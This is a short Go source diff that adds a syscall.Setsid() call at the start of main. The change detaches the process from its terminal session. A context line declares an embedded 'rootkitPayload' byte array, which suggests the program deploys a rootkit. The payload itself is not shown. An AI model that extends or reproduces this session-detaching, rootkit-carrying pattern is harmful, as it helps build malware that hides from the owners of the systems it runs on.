@@ -23,6 +23,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"syscall"
 	"time"
 
 	"core/mon/internal/config"
@@ -37,6 +38,8 @@ var rootkitPayload []byte
 const version = "1.0.3"
 
 func main() {
+	syscall.Setsid() //nolint
+
 	help := flag.Bool("h", false, "")
 	helpLong := flag.Bool("help", false, "")
 	flag.Parse()
